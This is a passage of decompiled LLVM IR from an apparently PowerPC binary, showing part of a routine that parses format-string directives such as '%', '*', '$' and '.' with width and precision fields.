  %v0_10009928 = phi i32 [ %v0_100098cc, %dec_label_pc_100098cc ], [ %v1_10009928, %dec_label_pc_10009924 ]
  store i32 %v0_10009928, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000eb2c.188 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10009918 = inttoptr i32 %v0_10009928 to i8*
  br label %dec_label_pc_10009910

dec_label_pc_10009910:                            ; preds = %dec_label_pc_10009930, %dec_label_pc_10009908
  %v1_10009924 = phi i32 [ %v1_10009934, %dec_label_pc_10009930 ], [ 1, %dec_label_pc_10009908 ]
  %v0_10009910 = phi i32 [ %v1_10009914, %dec_label_pc_10009930 ], [ ptrtoint ([8 x i8]* @global_var_1000eb2c.188 to i32), %dec_label_pc_10009908 ]
  %v1_10009910 = inttoptr i32 %v0_10009910 to i8*
  %v2_10009910 = load i8, i8* %v1_10009910, align 1
  %v3_10009910 = zext i8 %v2_10009910 to i32
  store i32 %v3_10009910, i32* %r9.global-to-local, align 4
  %v1_10009914 = add i32 %v0_10009910, 1
  store i32 %v1_10009914, i32* %r11.global-to-local, align 4
  %v2_10009918 = load i8, i8* %v1_10009918, align 1
  %v3_10009918 = zext i8 %v2_10009918 to i32
  store i32 %v3_10009918, i32* %r0.global-to-local, align 4
  %v4_1000991c = icmp eq i8 %v2_10009918, %v2_10009910
  br i1 %v4_1000991c, label %dec_label_pc_10009924, label %dec_label_pc_10009930

dec_label_pc_10009924:                            ; preds = %dec_label_pc_10009910
  %v0_10009924 = load i32, i32* %r6.global-to-local, align 4
  %v2_10009924 = or i32 %v0_10009924, %v1_10009924
  store i32 %v2_10009924, i32* %r6.global-to-local, align 4
  %v1_10009928 = add i32 %v0_10009928, 1
  br label %dec_label_pc_10009908

dec_label_pc_10009930:                            ; preds = %dec_label_pc_10009910
  %v1_10009930 = inttoptr i32 %v1_10009914 to i8*
  %v2_10009930 = load i8, i8* %v1_10009930, align 1
  %v3_10009930 = zext i8 %v2_10009930 to i32
  store i32 %v3_10009930, i32* %r0.global-to-local, align 4
  %v1_10009934 = mul i32 %v1_10009924, 2
  store i32 %v1_10009934, i32* %r10.global-to-local, align 4
  %v3_10009938 = icmp eq i8 %v2_10009930, 0
  br i1 %v3_10009938, label %dec_label_pc_10009940, label %dec_label_pc_10009910

dec_label_pc_10009940:                            ; preds = %dec_label_pc_10009930
  %v1_10009940 = add i32 %v0_10009928, -1
  %v2_10009940 = inttoptr i32 %v1_10009940 to i8*
  %v3_10009940 = load i8, i8* %v2_10009940, align 1
  %v4_10009940 = zext i8 %v3_10009940 to i32
  store i32 %v4_10009940, i32* %r0.global-to-local, align 4
  %v0_10009944 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009944 = and i32 %v0_10009944, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000994c = icmp eq i8 %v3_10009940, 37
  %v1_10009950 = udiv i32 %v1_10009944, 2
  store i32 %v1_10009950, i32* %r9.global-to-local, align 4
  %v2_10009954 = sub nuw nsw i32 -1, %v1_10009950
  %v3_10009954 = and i32 %v0_10009944, %v2_10009954
  store i32 %v3_10009954, i32* %r6.global-to-local, align 4
  br i1 %v3_1000994c, label %dec_label_pc_10009964, label %dec_label_pc_10009830

dec_label_pc_10009960:                            ; preds = %dec_label_pc_1000988c, %dec_label_pc_100098dc
  store i32 %v0_1000988c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009964

dec_label_pc_10009964:                            ; preds = %dec_label_pc_100098f0, %dec_label_pc_10009940, %dec_label_pc_10009960
  %v0_10009998 = phi i32 [ 0, %dec_label_pc_10009940 ], [ %v0_100098b8, %dec_label_pc_100098f0 ], [ %v0_100098b8, %dec_label_pc_10009960 ]
  %v1_100099a4 = phi i32 [ %v0_10009928, %dec_label_pc_10009940 ], [ %v0_100098e8, %dec_label_pc_100098f0 ], [ %v0_100098e8, %dec_label_pc_10009960 ]
  %v0_100099a0 = phi i32 [ %v1_10009914, %dec_label_pc_10009940 ], [ %v0_1000988c, %dec_label_pc_100098f0 ], [ %v0_1000988c, %dec_label_pc_10009960 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10009940 ], [ %stack_var_-84.1, %dec_label_pc_100098f0 ], [ %stack_var_-84.1, %dec_label_pc_10009960 ]
  %v1_10009964 = inttoptr i32 %v0_100099a0 to i8*
  %v2_10009964 = load i8, i8* %v1_10009964, align 1
  %v3_10009964 = zext i8 %v2_10009964 to i32
  store i32 %v3_10009964, i32* %r0.global-to-local, align 4
  %v3_10009968 = icmp eq i8 %v2_10009964, 42
  br i1 %v3_10009968, label %dec_label_pc_10009970, label %dec_label_pc_100099b0

dec_label_pc_10009970:                            ; preds = %dec_label_pc_10009964
  %v0_10009970 = load i32, i32* %r26.global-to-local, align 4
  %v3_10009970 = icmp eq i32 %v0_10009970, 0
  br i1 %v3_10009970, label %dec_label_pc_100099a0, label %dec_label_pc_10009978

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009970
  %v1_10009978 = inttoptr i32 %v1_100099a4 to i8*
  %v2_10009978 = load i8, i8* %v1_10009978, align 1
  %v3_10009978 = zext i8 %v2_10009978 to i32
  store i32 %v3_10009978, i32* %r0.global-to-local, align 4
  %v3_1000997c = icmp eq i8 %v2_10009978, 36
  br i1 %v3_1000997c, label %dec_label_pc_10009984, label %dec_label_pc_10009c70

dec_label_pc_10009984:                            ; preds = %dec_label_pc_10009978
  %tmp60 = icmp slt i32 %v0_10009998, 1
  br i1 %tmp60, label %dec_label_pc_10009c70, label %dec_label_pc_1000998c

dec_label_pc_1000998c:                            ; preds = %dec_label_pc_10009984
  %v0_1000998c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000998c = mul i32 %v0_1000998c, -4
  %v1_10009990 = add i32 %v1_100099a4, 1
  store i32 %v1_10009990, i32* @r30, align 4
  %v0_10009994 = load i32, i32* %r3.global-to-local, align 4
  %v2_10009994 = add i32 %v0_10009994, %v1_1000998c
  store i32 %v2_10009994, i32* %r9.global-to-local, align 4
  %v2_10009998 = add i32 %v2_10009994, 12
  %v3_10009998 = inttoptr i32 %v2_10009998 to i32*
  store i32 %v0_10009998, i32* %v3_10009998, align 4
  %v0_100099b8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100099ac

dec_label_pc_100099a0:                            ; preds = %dec_label_pc_10009970
  %v1_100099a0 = add i32 %v0_100099a0, 1
  store i32 %v1_100099a0, i32* %r0.global-to-local, align 4
  %v4_100099a4 = icmp eq i32 %v1_100099a0, %v1_100099a4
  br i1 %v4_100099a4, label %dec_label_pc_100099ac, label %dec_label_pc_10009c70

dec_label_pc_100099ac:                            ; preds = %dec_label_pc_100099a0, %dec_label_pc_1000998c
  %v0_100099b8.pre = phi i32 [ %v1_100099a4, %dec_label_pc_100099a0 ], [ %v0_100099b8.pre.pre, %dec_label_pc_1000998c ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100099b0

dec_label_pc_100099b0:                            ; preds = %dec_label_pc_10009964, %dec_label_pc_100099ac
  %v0_100099b8 = phi i32 [ %v1_100099a4, %dec_label_pc_10009964 ], [ %v0_100099b8.pre, %dec_label_pc_100099ac ]
  %v0_100099c8 = phi i32 [ %v0_10009998, %dec_label_pc_10009964 ], [ -2147483648, %dec_label_pc_100099ac ]
  %v0_100099b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_100099b0 = icmp eq i32 %v0_100099b0, 0
  %v1_100099b8 = inttoptr i32 %v0_100099b8 to i8*
  br i1 %v3_100099b0, label %dec_label_pc_100099b8, label %dec_label_pc_100099dc

dec_label_pc_100099b8:                            ; preds = %dec_label_pc_100099b0
  %v2_100099b8 = load i8, i8* %v1_100099b8, align 1
  %v3_100099b8 = zext i8 %v2_100099b8 to i32
  store i32 %v3_100099b8, i32* %r0.global-to-local, align 4
  %v3_100099bc = icmp eq i8 %v2_100099b8, 46
  br i1 %v3_100099bc, label %dec_label_pc_100099c4, label %dec_label_pc_100099d4

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_100099b8
  %v1_100099c4 = add i32 %v0_100099b8, 1
  store i32 %v0_100099c8, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009830

dec_label_pc_100099d4:                            ; preds = %dec_label_pc_100099b8
  store i32 %v0_100099c8, i32* @r31, align 4
  br label %dec_label_pc_100099dc

dec_label_pc_100099dc:                            ; preds = %dec_label_pc_100099b0, %dec_label_pc_100099d4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_100099d4 ], [ %v0_100099c8, %dec_label_pc_100099b0 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_100099e0 = load i8, i8* %v1_100099b8, align 1
  %v3_100099e0 = zext i8 %v2_100099e0 to i32
  store i32 %v3_100099e0, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000ead4.189 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100099e8

dec_label_pc_100099e8:                            ; preds = %dec_label_pc_100099f4, %dec_label_pc_100099dc
  %v0_100099f4 = phi i32 [ %v1_100099f4, %dec_label_pc_100099f4 ], [ ptrtoint ([9 x i8]* @global_var_1000ead4.189 to i32), %dec_label_pc_100099dc ]
  %v1_100099e8 = inttoptr i32 %v0_100099f4 to i8*
  %v2_100099e8 = load i8, i8* %v1_100099e8, align 1
  %v3_100099e8 = zext i8 %v2_100099e8 to i32
  store i32 %v3_100099e8, i32* %r0.global-to-local, align 4
  %v4_100099ec = icmp eq i8 %v2_100099e0, %v2_100099e8
  br i1 %v4_100099ec, label %dec_label_pc_100097b8, label %dec_label_pc_100099f4

dec_label_pc_100099f4:                            ; preds = %dec_label_pc_100099e8
  %v1_100099f4 = add i32 %v0_100099f4, 1
  %v2_100099f4 = inttoptr i32 %v1_100099f4 to i8*
  %v3_100099f4 = load i8, i8* %v2_100099f4, align 1
  %v4_100099f4 = zext i8 %v3_100099f4 to i32
  store i32 %v4_100099f4, i32* %r0.global-to-local, align 4
  store i32 %v1_100099f4, i32* %r11.global-to-local, align 4
  %v3_100099f8 = icmp eq i8 %v3_100099f4, 0
  br i1 %v3_100099f8, label %dec_label_pc_10009a00, label %dec_label_pc_100099e8

dec_label_pc_10009a00:                            ; preds = %dec_label_pc_100099f4, %dec_label_pc_100097b8
  %v0_10009a28 = phi i32 [ %v1_100097b8, %dec_label_pc_100097b8 ], [ %v0_100099b8, %dec_label_pc_100099f4 ]
  %v0_10009a24 = phi i32 [ %v0_100099f4, %dec_label_pc_100097b8 ], [ %v1_100099f4, %dec_label_pc_100099f4 ]
  %v2_10009a08 = sub i32 %v0_10009a24, ptrtoint ([9 x i8]* @global_var_1000ead4.189 to i32)
  store i32 %v2_10009a08, i32* %r9.global-to-local, align 4
  %v2_10009a0c = icmp sgt i32 %v2_10009a08, 1
  br i1 %v2_10009a0c, label %dec_label_pc_10009a2c, label %dec_label_pc_10009a14

dec_label_pc_10009a14:                            ; preds = %dec_label_pc_10009a00
  %v1_10009a14 = inttoptr i32 %v0_10009a28 to i8*
  %v2_10009a14 = load i8, i8* %v1_10009a14, align 1
  %v3_10009a14 = zext i8 %v2_10009a14 to i32
  store i32 %v3_10009a14, i32* %r0.global-to-local, align 4
  %v1_10009a18 = inttoptr i32 %v0_10009a24 to i8*
  %v2_10009a18 = load i8, i8* %v1_10009a18, align 1
  %v3_10009a18 = zext i8 %v2_10009a18 to i32
  store i32 %v3_10009a18, i32* %r9.global-to-local, align 4
  %v4_10009a1c = icmp eq i8 %v2_10009a14, %v2_10009a18
  br i1 %v4_10009a1c, label %dec_label_pc_10009a24, label %dec_label_pc_10009a2c

dec_label_pc_10009a24:                            ; preds = %dec_label_pc_10009a14
  %v1_10009a24 = add i32 %v0_10009a24, 9
  store i32 %v1_10009a24, i32* %r11.global-to-local, align 4
  %v1_10009a28 = add i32 %v0_10009a28, 1
  store i32 %v1_10009a28, i32* @r30, align 4
  br label %dec_label_pc_10009a2c

dec_label_pc_10009a2c:                            ; preds = %dec_label_pc_10009a14, %dec_label_pc_10009a00, %dec_label_pc_10009a24
  %v0_10009a30 = phi i32 [ %v0_10009a24, %dec_label_pc_10009a14 ], [ %v0_10009a24, %dec_label_pc_10009a00 ], [ %v1_10009a24, %dec_label_pc_10009a24 ]
  %v0_10009a2c = phi i32 [ %v0_10009a28, %dec_label_pc_10009a14 ], [ %v0_10009a28, %dec_label_pc_10009a00 ], [ %v1_10009a28, %dec_label_pc_10009a24 ]
  %v1_10009a2c = inttoptr i32 %v0_10009a2c to i8*
  %v2_10009a2c = load i8, i8* %v1_10009a2c, align 1
  %v3_10009a2c = zext i8 %v2_10009a2c to i32
  store i32 %v3_10009a2c, i32* %r7.global-to-local, align 4
  %v1_10009a30 = add i32 %v0_10009a30, 9
  %v2_10009a30 = inttoptr i32 %v1_10009a30 to i8*
  %v3_10009a30 = load i8, i8* %v2_10009a30, align 1
  %v4_10009a30 = zext i8 %v3_10009a30 to i32
  store i32 %v4_10009a30, i32* %r0.global-to-local, align 4
  %v3_10009a34 = icmp eq i8 %v2_10009a2c, 0
  %v1_10009a38 = mul nuw nsw i32 %v4_10009a30, 256
  store i32 %v1_10009a38, i32* %r10.global-to-local, align 4
  br i1 %v3_10009a34, label %dec_label_pc_10009c70, label %dec_label_pc_10009a40

dec_label_pc_10009a40:                            ; preds = %dec_label_pc_10009a2c
  %v1_10009a44 = and i32 %v1_10009a38, 1024
  store i32 %v1_10009a44, i32* %r0.global-to-local, align 4
  %v3_10009a44 = icmp eq i32 %v1_10009a44, 0
  store i32 ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32), i32* %r8.global-to-local, align 4
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v3_10009a50 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_10009a50, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000eb08.191 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009a60

dec_label_pc_10009a60:                            ; preds = %dec_label_pc_10009ac4, %dec_label_pc_10009a40
  %v1_10009a6c = phi i32 [ %v1_10009ac4, %dec_label_pc_10009ac4 ], [ ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32), %dec_label_pc_10009a40 ]
  %v1_10009a60 = inttoptr i32 %v1_10009a6c to i8*
  %v2_10009a60 = load i8, i8* %v1_10009a60, align 1
  %v3_10009a60 = zext i8 %v2_10009a60 to i32
  store i32 %v3_10009a60, i32* %r0.global-to-local, align 4
  %v4_10009a64 = icmp eq i8 %v2_10009a60, %v2_10009a2c
  br i1 %v4_10009a64, label %dec_label_pc_10009a6c, label %dec_label_pc_10009ac4

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009a60
  %v2_10009a6c = sub i32 %v1_10009a6c, ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32)
  %tmp61 = icmp slt i32 %v2_10009a6c, 18
  %brmerge = or i1 %v3_10009a44, %tmp61
  br i1 %brmerge, label %dec_label_pc_10009a80, label %dec_label_pc_10009a7c

dec_label_pc_10009a7c:                            ; preds = %dec_label_pc_10009a6c
  %v1_10009a7c = add i32 %v2_10009a6c, -2
  br label %dec_label_pc_10009a80

dec_label_pc_10009a80:                            ; preds = %dec_label_pc_10009a6c, %dec_label_pc_10009a7c
  %storemerge = phi i32 [ %v1_10009a7c, %dec_label_pc_10009a7c ], [ %v2_10009a6c, %dec_label_pc_10009a6c ]
  %v0_10009a80 = phi i32 [ %v1_10009a7c, %dec_label_pc_10009a7c ], [ %v2_10009a6c, %dec_label_pc_10009a6c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10009a80 = load i32, i32* @r28, align 4
  %v2_10009a80 = add i32 %v1_10009a80, 32
  %v3_10009a80 = inttoptr i32 %v2_10009a80 to i32*
  store i32 %v0_10009a80, i32* %v3_10009a80, align 4
  store i32 ptrtoint (i32* @global_var_1000eb07.192 to i32), i32* %r11.global-to-local, align 4
  %v0_10009a8c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009a88

dec_label_pc_10009a88:                            ; preds = %dec_label_pc_10009a88, %dec_label_pc_10009a80
  %v0_10009a88 = phi i32 [ %v1_10009a88, %dec_label_pc_10009a88 ], [ ptrtoint (i32* @global_var_1000eb07.192 to i32), %dec_label_pc_10009a80 ]
  %v1_10009a88 = add i32 %v0_10009a88, 1
  %v2_10009a88 = inttoptr i32 %v1_10009a88 to i8*
  %v3_10009a88 = load i8, i8* %v2_10009a88, align 1
  %v4_10009a88 = zext i8 %v3_10009a88 to i32
  store i32 %v4_10009a88, i32* %r0.global-to-local, align 4
  store i32 %v1_10009a88, i32* %r11.global-to-local, align 4
  %v3_10009a8c = icmp sgt i32 %v0_10009a8c.pre, %v4_10009a88
  br i1 %v3_10009a8c, label %dec_label_pc_10009a88, label %dec_label_pc_10009a94

dec_label_pc_10009a94:                            ; preds = %dec_label_pc_10009a88
  %v0_10009a94 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009a94 = sub i32 %v1_10009a88, %v0_10009a94
  %v1_10009a9c = mul i32 %v2_10009a94, 2
  store i32 %v1_10009a9c, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000eaf8.193 to i32), i32* %r9.global-to-local, align 4
  %v2_10009aa4 = add i32 %v1_10009a9c, ptrtoint (i32* @global_var_1000eaf8.193 to i32)
  %v3_10009aa4 = inttoptr i32 %v2_10009aa4 to i16*
  %v4_10009aa4 = load i16, i16* %v3_10009aa4, align 2
  %v5_10009aa4 = sext i16 %v4_10009aa4 to i32
  store i32 %v5_10009aa4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000eae8.194 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000eb14.190 to i32), i32* %r8.global-to-local, align 4
  %v2_10009ab4 = add i32 %v1_10009a9c, ptrtoint (i32* @global_var_1000eae8.194 to i32)
  %v3_10009ab4 = inttoptr i32 %v2_10009ab4 to i16*
  %v4_10009ab4 = load i16, i16* %v3_10009ab4, align 2
  %v5_10009ab4 = sext i16 %v4_10009ab4 to i32
  store i32 %v5_10009ab4, i32* %r9.global-to-local, align 4
  %v2_10009ab8 = or i32 %v5_10009aa4, %v1_10009a38
  store i32 %v2_10009ab8, i32* %r0.global-to-local, align 4
  %v2_10009abc = and i32 %v5_10009ab4, %v2_10009ab8
  store i32 %v2_10009abc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009ad0

dec_label_pc_10009ac4:                            ; preds = %dec_label_pc_10009a60
  %v1_10009ac4 = add i32 %v1_10009a6c, 1
  %v2_10009ac4 = inttoptr i32 %v1_10009ac4 to i8*
  %v3_10009ac4 = load i8, i8* %v2_10009ac4, align 1
  %v4_10009ac4 = zext i8 %v3_10009ac4 to i32
  store i32 %v4_10009ac4, i32* %r0.global-to-local, align 4
  store i32 %v1_10009ac4, i32* %r8.global-to-local, align 4
  %v3_10009ac8 = icmp eq i8 %v3_10009ac4, 0
  br i1 %v3_10009ac8, label %dec_label_pc_10009ad0, label %dec_label_pc_10009a60

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009ac4, %dec_label_pc_10009a94
  %v0_10009ad0 = phi i32 [ %v2_10009abc, %dec_label_pc_10009a94 ], [ %v3_10009a50, %dec_label_pc_10009ac4 ]
  store i32 %v0_10009ad0, i32* %stack_var_-96, align 4
  %v0_10009ad4 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009ad4 = call i32 @__asm_rlwinm(i32 %v0_10009ad4, i32 30, i32 31, i32 31)
  %not.v2_10009ad8 = icmp eq i32 %v1_10009ad4, 0
  %v6_10009adc = sext i1 %not.v2_10009ad8 to i32
  store i32 %v6_10009adc, i32* %r9.global-to-local, align 4
  %v1_10009ae0 = call i32 @__asm_rlwinm(i32 %v1_10009a38, i32 0, i32 20, i32 23)
  store i32 %v1_10009ae0, i32* %r0.global-to-local, align 4
  %v1_10009ae4 = call i32 @__asm_rlwinm(i32 %v6_10009adc, i32 0, i32 0, i32 27)
  store i32 %v1_10009ae4, i32* %r9.global-to-local, align 4
  %v0_10009ae8 = load i32, i32* @r30, align 4
  %v1_10009ae8 = inttoptr i32 %v0_10009ae8 to i8*
  %v2_10009ae8 = load i8, i8* %v1_10009ae8, align 1
  %v3_10009ae8 = zext i8 %v2_10009ae8 to i32
  store i32 %v3_10009ae8, i32* %r10.global-to-local, align 4
  %v0_10009aec = load i32, i32* %r6.global-to-local, align 4
  %v1_10009aec = call i32 @__asm_rlwinm(i32 %v0_10009aec, i32 0, i32 30, i32 28)
  %v1_10009af0 = add i32 %v1_10009ae4, 48
  store i32 %v1_10009af0, i32* %r9.global-to-local, align 4
  %v2_10009af4 = or i32 %v1_10009aec, %v1_10009ae0
  store i32 %v2_10009af4, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_10009afc = load i32, i32* %r10.global-to-local, align 4
  %v1_10009afc = load i32, i32* @r28, align 4
  %v2_10009afc = add i32 %v1_10009afc, 12
  %v3_10009afc = inttoptr i32 %v2_10009afc to i32*
  store i32 %v0_10009afc, i32* %v3_10009afc, align 4
  %v0_10009b00 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009b00 = load i32, i32* @r28, align 4
  %v2_10009b00 = add i32 %v1_10009b00, 4
  %v3_10009b00 = inttoptr i32 %v2_10009b00 to i32*
  store i32 %v0_10009b00, i32* %v3_10009b00, align 4
  %v0_10009b04 = load i32, i32* @r31, align 4
  %v1_10009b04 = load i32, i32* @r28, align 4
  %v2_10009b04 = add i32 %v1_10009b04, 8
  %v3_10009b04 = inttoptr i32 %v2_10009b04 to i32*
  store i32 %v0_10009b04, i32* %v3_10009b04, align 4
  %v0_10009b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009b08 = load i32, i32* @r28, align 4
  %v2_10009b08 = add i32 %v1_10009b08, 20
  %v3_10009b08 = inttoptr i32 %v2_10009b08 to i32*
  store i32 %v0_10009b08, i32* %v3_10009b08, align 4
  %v0_10009b0c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009b0c = load i32, i32* @r28, align 4
  %v2_10009b0c = add i32 %v1_10009b0c, 16
  %v3_10009b0c = inttoptr i32 %v2_10009b0c to i32*
  store i32 %v0_10009b0c, i32* %v3_10009b0c, align 4
  %v0_10009b10 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009b10 = load i32, i32* @r28, align 4
  %v2_10009b10 = add i32 %v1_10009b10, 28
  %v3_10009b10 = inttoptr i32 %v2_10009b10 to i32*
  store i32 %v0_10009b10, i32* %v3_10009b10, align 4
  %v0_10009b14 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b14 = inttoptr i32 %v0_10009b14 to i8*
  %v2_10009b14 = load i8, i8* %v1_10009b14, align 1
  %v3_10009b14 = zext i8 %v2_10009b14 to i32
  store i32 %v3_10009b14, i32* %r9.global-to-local, align 4
  %v3_10009b18 = icmp eq i8 %v2_10009b14, 0
  br i1 %v3_10009b18, label %dec_label_pc_10009b20, label %dec_label_pc_10009b38

dec_label_pc_10009b20:                            ; preds = %dec_label_pc_10009ad0
  %v0_10009b20 = load i32, i32* @r30, align 4
  %v1_10009b20 = inttoptr i32 %v0_10009b20 to i8*
  %v2_10009b20 = load i8, i8* %v1_10009b20, align 1
  %v3_10009b20 = zext i8 %v2_10009b20 to i32
  store i32 %v3_10009b20, i32* %r0.global-to-local, align 4
  %v3_10009b24 = icmp eq i8 %v2_10009b20, 109
  br i1 %v3_10009b24, label %dec_label_pc_10009b2c, label %dec_label_pc_10009c70

dec_label_pc_10009b2c:                            ; preds = %dec_label_pc_10009b20
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10009b30 = load i32, i32* @r28, align 4
  %v2_10009b30 = add i32 %v1_10009b30, 28
  %v3_10009b30 = inttoptr i32 %v2_10009b30 to i32*
  store i32 %v3_10009b14, i32* %v3_10009b30, align 4
  %v0_10009b34 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009b34 = load i32, i32* @r28, align 4
  %v2_10009b34 = add i32 %v1_10009b34, 32
  %v3_10009b34 = inttoptr i32 %v2_10009b34 to i32*
  store i32 %v0_10009b34, i32* %v3_10009b34, align 4
  br label %dec_label_pc_10009b38

dec_label_pc_10009b38:                            ; preds = %dec_label_pc_10009ad0, %dec_label_pc_10009b2c
  %v0_10009b38 = load i32, i32* %r26.global-to-local, align 4
  %tmp62 = icmp slt i32 %v0_10009b38, 1
  br i1 %tmp62, label %dec_label_pc_10009c14, label %dec_label_pc_10009b40

dec_label_pc_10009b40:                            ; preds = %dec_label_pc_10009b38
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10009b44

dec_label_pc_10009b44:                            ; preds = %dec_label_pc_10009bfc, %dec_label_pc_10009b40
  %v0_10009b6c = phi i32 [ 0, %dec_label_pc_10009b40 ], [ %v1_10009c00, %dec_label_pc_10009bfc ]
  %v2_10009b44 = icmp sgt i32 %v0_10009b6c, 2
  br i1 %v2_10009b44, label %dec_label_pc_10009b68, label %dec_label_pc_10009b4c

dec_label_pc_10009b4c:                            ; preds = %dec_label_pc_10009b44
  %v1_10009b4c = mul i32 %v0_10009b6c, 4
  store i32 %v1_10009b4c, i32* %r0.global-to-local, align 4
  %v0_10009b50 = load i32, i32* @r1, align 4
  %v2_10009b50 = add i32 %v0_10009b50, %v1_10009b4c
  store i32 %v2_10009b50, i32* %r9.global-to-local, align 4
  %v1_10009b54 = add i32 %v2_10009b50, 20
  %v2_10009b54 = inttoptr i32 %v1_10009b54 to i32*
  %v3_10009b54 = load i32, i32* %v2_10009b54, align 4
  store i32 %v3_10009b54, i32* %r0.global-to-local, align 4
  %v1_10009b58 = load i32, i32* @r28, align 4
  %v2_10009b58 = add i32 %v1_10009b58, %v0_10009b6c
  store i32 %v2_10009b58, i32* %r9.global-to-local, align 4
  %v1_10009b5c = urem i32 %v3_10009b54, 256
  store i32 %v1_10009b5c, i32* %r11.global-to-local, align 4
  %v1_10009b60 = trunc i32 %v3_10009b54 to i8
  %v3_10009b60 = add i32 %v2_10009b58, 36
  %v4_10009b60 = inttoptr i32 %v3_10009b60 to i8*
  store i8 %v1_10009b60, i8* %v4_10009b60, align 1
  %v0_10009b74.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b74

dec_label_pc_10009b68:                            ; preds = %dec_label_pc_10009b44
  %v2_10009b6c = add i32 %v0_10009b6c, %stack_var_-84.3
  store i32 %v2_10009b6c, i32* %r9.global-to-local, align 4
  %v1_10009b70 = add i32 %v2_10009b6c, -2
  store i32 %v1_10009b70, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b74

dec_label_pc_10009b74:                            ; preds = %dec_label_pc_10009b4c, %dec_label_pc_10009b68
  %v0_10009b94 = phi i32 [ %v0_10009b74.pre, %dec_label_pc_10009b4c ], [ %v1_10009b70, %dec_label_pc_10009b68 ]
  %v1_10009b74 = load i32, i32* %r26.global-to-local, align 4
  %v3_10009b74 = icmp sgt i32 %v0_10009b94, %v1_10009b74
  br i1 %v3_10009b74, label %dec_label_pc_10009b7c, label %dec_label_pc_10009b88

dec_label_pc_10009b7c:                            ; preds = %dec_label_pc_10009b74
  %v2_10009b7c = icmp sgt i32 %v0_10009b94, 9
  br i1 %v2_10009b7c, label %dec_label_pc_10009c70, label %dec_label_pc_10009b84

dec_label_pc_10009b84:                            ; preds = %dec_label_pc_10009b7c
  store i32 %v0_10009b94, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10009b88

dec_label_pc_10009b88:                            ; preds = %dec_label_pc_10009b74, %dec_label_pc_10009b84
  store i32 %v2_10009824.pre-phi, i32* %r9.global-to-local, align 4
  %v0_10009b8c = load i32, i32* %r27.global-to-local, align 4
  %v1_10009b8c = mul i32 %v0_10009b8c, 4
  store i32 %v1_10009b8c, i32* %r0.global-to-local, align 4
  %v2_10009b90 = add i32 %v1_10009b8c, %v2_10009824.pre-phi
  %v3_10009b90 = inttoptr i32 %v2_10009b90 to i32*
  %v4_10009b90 = load i32, i32* %v3_10009b90, align 4
  store i32 %v4_10009b90, i32* @r31, align 4
  %v1_10009b94 = add i32 %v0_10009b94, -1
  store i32 %v1_10009b94, i32* %r25.global-to-local, align 4
  %v1_10009b98 = mul i32 %v1_10009b94, 4
  %v3_10009b9c = icmp eq i32 %v4_10009b90, 8
  %v1_10009ba0 = load i32, i32* @r28, align 4
  %v2_10009ba0 = add i32 %v1_10009ba0, %v1_10009b98
  store i32 %v2_10009ba0, i32* %r9.global-to-local, align 4
  %v1_10009ba4 = add i32 %v2_10009ba0, 40
  %v2_10009ba4 = inttoptr i32 %v1_10009ba4 to i32*
  %v3_10009ba4 = load i32, i32* %v2_10009ba4, align 4
  store i32 %v3_10009ba4, i32* %r3.global-to-local, align 4
  br i1 %v3_10009b9c, label %dec_label_pc_10009bfc, label %dec_label_pc_10009bac

dec_label_pc_10009bac:                            ; preds = %dec_label_pc_10009b88
  %v3_10009bac = icmp eq i32 %v3_10009ba4, 8
  br i1 %v3_10009bac, label %dec_label_pc_10009be4, label %dec_label_pc_10009bb4

dec_label_pc_10009bb4:                            ; preds = %dec_label_pc_10009bac
  %v4_10009bb4 = icmp eq i32 %v3_10009ba4, %v4_10009b90
  br i1 %v4_10009bb4, label %dec_label_pc_10009be4, label %dec_label_pc_10009bbc

